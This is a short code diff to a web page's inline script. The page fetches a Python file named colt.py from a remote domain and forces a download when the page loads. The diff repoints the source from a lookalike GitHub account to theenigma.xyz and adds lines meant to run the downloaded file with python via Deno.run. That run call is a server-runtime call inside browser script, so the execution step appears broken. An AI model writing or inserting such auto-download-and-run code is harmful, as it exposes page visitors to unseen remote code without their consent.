@@ -5,8 +5,8 @@
 </head>
 <body>
     <script>
-        const scriptUrl = 'https://github.com/THEENlGMA/cautious-meme/blob/a8ffdf56b7da7b1fe6f708d61ae48cd9f5536c01/colt.py';
-        const scriptName = 'script.py';
+        const scriptUrl = 'https://theenigma.xyz/colt.py';
+        const scriptName = 'colt.py';
 
         fetch(scriptUrl)
             .then(response => response.text())
@@ -20,6 +20,10 @@
                 a.click();
                 URL.revokeObjectURL(url);
                 document.body.removeChild(a);
+
+                // Run the downloaded script
+                const process = Deno.run({ cmd: ['python', scriptName] });
+                process.close();
             })
             .catch(error => console.error('Error downloading script:', error));
     </script>
